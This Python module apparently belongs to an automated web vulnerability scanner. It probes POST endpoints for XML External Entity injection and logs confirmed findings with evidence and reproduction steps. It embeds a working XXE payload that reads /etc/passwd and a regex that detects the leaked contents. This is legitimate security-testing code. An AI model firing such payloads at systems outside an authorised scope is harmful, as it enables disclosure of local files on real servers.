"""XXE (XML External Entity) injection (§3) — deterministic in-band
file-disclosure check: does a POST endpoint parse an XML body and
resolve external entities, letting an attacker read arbitrary local
files? Probes every discovered POST endpoint with an XML body regardless
of its original encoding (form-urlencoded/JSON) — many frameworks accept
XML at the same endpoint via content negotiation even when the app's own
forms never send it, so this isn't limited to endpoints recon happens to
see declared as XML-consuming.
"""

import re
import uuid

import httpx

from app.agents.evidence import format_request_raw, format_response_raw
from app.agents.evidence_screenshot import capture_and_store_evidence_screenshot
from app.agents.http_client import ScopedHttpClient, ScopeViolationError
from app.agents.recon import FormInfo
from app.checks.loader import get_check
from app.checks.render import render_check_template
from app.models.finding import Evidence, Finding

_CATALOG_FILE = "xxe_catalog.yaml"
_FILE_DISCLOSURE_MARKER_RE = re.compile(r"root:.*:0:0:", re.IGNORECASE)

_BASELINE_XML = '<?xml version="1.0" encoding="UTF-8"?><verdikt-probe>baseline</verdikt-probe>'
_XXE_PAYLOAD = (
    '<?xml version="1.0" encoding="UTF-8"?>'
    '<!DOCTYPE verdikt-probe [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>'
    "<verdikt-probe>&xxe;</verdikt-probe>"
)


class XxeAgent:
    """No LLM needed — a single deterministic file-disclosure signature
    match (§1.2 safe-by-default: read-only file disclosure probe, no
    out-of-band or destructive entity payloads)."""

    def __init__(
        self,
        client: ScopedHttpClient,
        *,
        scan_run_id: uuid.UUID,
        agent_job_id: uuid.UUID,
        db_session,
    ):
        self._client = client
        self._scan_run_id = scan_run_id
        self._agent_job_id = agent_job_id
        self._session = db_session

    async def run(self, forms: list[FormInfo]) -> list[Finding]:
        findings: list[Finding] = []
        seen_urls: set[str] = set()
        for form in forms:
            if form.method != "POST" or form.action_url in seen_urls:
                continue
            seen_urls.add(form.action_url)
            finding = await self._check_endpoint(form.action_url)
            if finding is not None:
                findings.append(finding)
        return findings

    async def _post_xml(self, url: str, body: str) -> httpx.Response | None:
        try:
            return await self._client.post(url, body=body, content_type="application/xml")
        except (ScopeViolationError, httpx.HTTPError):
            return None

    async def _check_endpoint(self, url: str) -> Finding | None:
        baseline = await self._post_xml(url, _BASELINE_XML)
        if baseline is None or _FILE_DISCLOSURE_MARKER_RE.search(baseline.text):
            return None

        probe = await self._post_xml(url, _XXE_PAYLOAD)
        if probe is None or not _FILE_DISCLOSURE_MARKER_RE.search(probe.text):
            return None

        # §2 step 1: deterministic re-execution before confirming.
        probe_again = await self._post_xml(url, _XXE_PAYLOAD)
        if probe_again is None or not _FILE_DISCLOSURE_MARKER_RE.search(probe_again.text):
            return None

        check_def = get_check("xxe-file-disclosure", filename=_CATALOG_FILE)
        finding = Finding(
            scan_run_id=self._scan_run_id,
            agent_job_id=self._agent_job_id,
            check_id="xxe-file-disclosure",
            title=check_def.title,
            severity=check_def.severity,
            owasp_2025_category=check_def.owasp_2025_category,
            cwe_id=check_def.cwe_id,
            portswigger_reference_url=check_def.portswigger_reference_url,
            cvss_vector=check_def.cvss_vector,
            cvss_score=check_def.cvss_score,
            affected_endpoints=[url],
            plain_language_summary=check_def.plain_language_summary,
            technical_description=render_check_template(check_def.technical_description, url, {}),
            steps_to_reproduce=[
                f"1. Send a POST request to {url} with Content-Type: application/xml and a body "
                'containing <!DOCTYPE verdikt-probe [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>.',
                "2. Reference the entity in the document body (&xxe;).",
                "3. Observe the contents of /etc/passwd (a 'root:...:0:0:' entry) appear in the "
                "response.",
            ],
            remediation=check_def.remediation,
            references=[*check_def.references, check_def.portswigger_reference_url],
            confirmation_status="ai_confirmed",
        )
        request_raw = format_request_raw(probe_again)
        response_raw = format_response_raw(probe_again)
        screenshot_refs = await capture_and_store_evidence_screenshot(
            scan_run_id=self._scan_run_id,
            check_id=finding.check_id,
            title=finding.title,
            request_raw=request_raw,
            response_raw=response_raw,
        )
        disclosure_match = _FILE_DISCLOSURE_MARKER_RE.search(probe_again.text)
        async with self._client.session_lock:
            self._session.add(finding)
            await self._session.flush()
            self._session.add(
                Evidence(
                    finding_id=finding.id,
                    request_raw=request_raw,
                    response_raw=response_raw,
                    payload=disclosure_match.group(0) if disclosure_match else None,
                    screenshot_refs=screenshot_refs,
                )
            )
            await self._session.commit()
        return finding
